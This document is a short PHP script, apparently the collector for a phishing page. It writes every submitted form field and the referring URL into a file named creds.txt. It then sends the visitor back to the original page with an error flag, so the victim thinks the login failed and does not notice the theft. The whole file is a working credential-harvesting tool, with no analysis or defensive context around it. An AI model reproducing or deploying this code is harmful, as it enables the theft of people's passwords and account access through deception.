<?php
if (!empty($_POST)) {
	file_put_contents('creds.txt', $_SERVER['HTTP_REFERER'].":".json_encode($_POST)."\n",FILE_APPEND);
	header("Location: ".$_SERVER['HTTP_REFERER']."?error=1");
}
?>